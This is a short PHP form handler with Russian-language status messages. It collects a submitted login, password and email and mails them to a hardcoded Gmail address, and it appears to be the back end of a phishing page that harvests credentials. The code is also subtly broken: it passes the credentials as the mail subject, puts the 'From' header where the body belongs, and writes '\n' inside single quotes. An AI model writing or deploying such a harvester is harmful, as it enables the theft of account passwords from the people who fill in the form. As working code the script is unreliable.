<?php

$login = $_POST['login'];
$pass = $_POST['pass'];
$email = $_POST['email'];

$login = htmlspecialchars($login);
$pass = htmlspecialchars($pass);
$email = htmlspecialchars($email);

$login = urldecode($login);
$pass = urldecode($pass);
$email = urldecode($email);

$login = trim($login);
$pass = trim($pass);
$email = trim($email);

if(mail(
	'wrgaming94@gmail.com',
	'Логин : ' . $login . '\n' .
	'Пароль :' . $pass . '\n' .
	'email : ' . $email,
	'From : wrgaming94@gmail.com')
) {
	echo ('Письмо успешно отправлено!');
} else {
	echo ('Ошибка отправки формы!');
}

?>